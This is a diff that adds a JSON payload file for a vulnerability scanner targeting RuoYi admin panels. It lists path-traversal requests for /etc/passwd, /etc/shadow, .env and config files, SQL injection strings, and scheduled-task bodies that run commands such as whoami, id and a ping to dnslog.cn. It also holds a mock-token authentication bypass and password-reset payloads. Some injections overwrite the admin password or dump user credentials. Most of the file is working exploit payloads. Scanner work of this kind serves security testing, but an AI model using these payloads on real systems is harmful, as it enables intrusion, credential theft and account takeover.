@@ -1,0 +1,93 @@
+{
+  "comment": "RuoYi 基础漏洞检测. 注意: Pro版(baseApi=/admin-api)和官方版(baseApi=/prod-api)路径不同",
+  "file_download": [
+    ["/common/download/resource?resource=/profile/../../../../../../../etc/passwd", "root:"],
+    ["/common/download/resource?resource=/etc/passwd", "root:"],
+    ["/common/download/resource?resource=../../../etc/passwd", "root:"],
+    ["/common/download/resource?name=/profile/../../../../../../../etc/passwd", "root:"],
+    ["/common/download/resource?name=../../../../../../../windows/win.ini", "[extensions]"],
+    ["/common/download/resource?resource=../../../../../../../windows/win.ini", "[extensions]"],
+    ["/common/download?fileName=../../../../../../../windows/win.ini&delete=false", "[extensions]"],
+    ["/common/download?fileName=../../../../../../../etc/passwd&delete=false", "root:"],
+    ["/common/download?fileName=../../../etc/passwd&delete=false", "root:"],
+    ["/profile/../../../../etc/passwd", "root:"],
+    ["/profile/../../../../windows/win.ini", "[extensions]"],
+    ["/common/download/resource?resource=/profile/application.yml", "spring:"],
+    ["/common/download?fileName=../application.yml", "spring:"],
+    ["/common/download/resource?resource=/profile/../../../../WEB-INF/web.xml", "<web-app"],
+    ["/common/download/resource?resource=/profile/../../../../BOOT-INF/classes/application.yml", "spring:"],
+    ["/common/download/resource?resource=/profile/db.properties", "jdbc:"],
+    ["/common/download?fileName=../ruoyi-admin/src/main/resources/application.yml", "spring:"],
+    ["/common/download/resource?resource=../../../../../../../../../../etc/shadow", "root:"],
+    ["/system/file/1/get/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "root:"],
+    ["/system/file/1/get/..%2F..%2F..%2F..%2F..%2F..%2Fapp%2F.env", "API_KEY"],
+    ["/system/file/1/get/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd", "root:"],
+    ["/system/file/1/get/..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini", "default"],
+    ["/system/file/1/get/..%2F..%2F..%2F..%2F..%2F..%2Fconfig%2Fapplication.yml", "spring:"]
+  ],
+  "file_download_type_allowed": [
+    "bmp","gif","jpg","jpeg","png","doc","docx","xls","xlsx","ppt","pptx","txt","rar","zip","gz","bz2","mp4","avi","rmvb","pdf"
+  ],
+  "sql_injection_paths": [
+    "/system/user/list",
+    "/system/role/list",
+    "/system/dept/list",
+    "/system/post/list",
+    "/system/dict/type/list",
+    "/system/dict/data/list",
+    "/system/config/list",
+    "/system/notice/list",
+    "/system/operlog/list",
+    "/system/logininfor/list",
+    "/system/user/online/list",
+    "/trade/brokerage/user/summary",
+    "/iot/device/message"
+  ],
+  "sql_injection_injects": [
+    "1 and 1=2",
+    "and+extractvalue(1,concat(0x7e,(select+user()),0x7e))",
+    "and+extractvalue(1,concat(0x7e,database(),0x7e))",
+    "and+updatexml(1,concat(0x7e,user(),0x7e),1)",
+    "and+updatexml(1,concat(0x7e,database(),0x7e),1)",
+    "and+(select+1+from+(select+count(*),concat(user(),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)b)",
+    "and+1=if(1=1,sleep(3),0)",
+    "and+1=if(1=2,sleep(3),0)",
+    "DESC;+UNION+SELECT+1,2,username,password,5,6,7,8,9,10+FROM+system_user;+--",
+    "DESC;+UPDATE+system_user+SET+password='hacked'+WHERE+username='admin';+--",
+    "DESC;+IF(SUBSTRING((SELECT+password+FROM+system_user+LIMIT+1),1,1)='a',SLEEP(5),1);+--",
+    "1+UNION+SELECT+username,password+FROM+system_user+WHERE+1=1",
+    "123;+UPDATE+system_user+SET+password='hacked'+WHERE+username='admin';+--",
+    "1+UNION+SELECT+table_name+FROM+information_schema.tables"
+  ],
+  "sql_injection_inject": "1 and 1=2",
+  "sql_injection_error_keywords": [
+    "syntax error", "SQL", "sql", "mysql", "SQLITE_ERROR",
+    "ORA-", "com.mysql", "oracle.jdbc", "Column not found",
+    "PDOException", "MDB2_ERROR", "Driver.*SQL",
+    "ymSqlException", "com.microsoft.sqlserver",
+    "postgresql", "driver", "db2", "h2database", "duplicate",
+    "constraint failed", "unique constraint"
+  ],
+  "scheduled_task_json": "{\"searchValue\":null,\"createBy\":\"admin\",\"createTime\":\"2024-01-10 11:11:11\",\"updateBy\":null,\"updateTime\":null,\"remark\":\"\",\"params\":{},\"jobId\":100,\"jobName\":\"ruoYiConfig.setProfile\",\"jobGroup\":\"DEFAULT\",\"invokeTarget\":\"ruoYiConfig.setProfile('C://windows/win.ini')\",\"cronExpression\":\"0/10 * * * * ?\",\"misfirePolicy\":\"2\",\"concurrent\":\"1\",\"status\":\"1\",\"nextValidTime\":\"2024-01-11 11:11:11\"}",
+  "scheduled_task_bodies": [
+    "{\"jobName\":\"rce\",\"jobGroup\":\"DEFAULT\",\"invokeTarget\":\"ryTask.ryParams('whoami')\",\"cronExpression\":\"*/10 * * * * ?\",\"misfirePolicy\":\"1\",\"concurrent\":\"1\",\"status\":\"0\"}",
+    "{\"jobName\":\"pwn\",\"jobGroup\":\"DEFAULT\",\"invokeTarget\":\"com.ruoyi.quartz.task.RyTask.ryParams('cmd=/c ping dnslog.cn')\",\"cronExpression\":\"*/10 * * * * ?\",\"misfirePolicy\":\"1\",\"concurrent\":\"1\",\"status\":\"0\"}",
+    "{\"jobName\":\"shell\",\"jobGroup\":\"DEFAULT\",\"invokeTarget\":\"ryTask.ryMultiParams('whoami,id,pwd')\",\"cronExpression\":\"*/10 * * * * ?\",\"misfirePolicy\":\"1\",\"concurrent\":\"1\",\"status\":\"0\"}"
+  ],
+  "password_reset_json": "{\"userId\":1,\"password\":\"$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2\"}",
+  "password_reset_with_old_json": "{\"userId\":1,\"oldPassword\":\"admin123\",\"newPassword\":\"$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2\"}",
+  "password_reset_verify_login": "admin/test123456",
+  "password_reset_pro_json": "{\"id\":147,\"password\":\"admin123\"}",
+  "mock_token_bypass": {
+    "comment": "RuoYi-Vue-Pro 3.5.0~3.8.0 Mock Token 认证绕过, Authorization头直接当mock-token解析",
+    "header": "Authorization",
+    "prefix": "Bearer ",
+    "payload_example": "Bearer test1"
+  },
+  "auth_bypass_paths": [
+    "/system/file/1/get/document.pdf",
+    "/system/file/2/get/confidential.pdf",
+    "/system/user/page",
+    "/system/user/update-password"
+  ]
+}
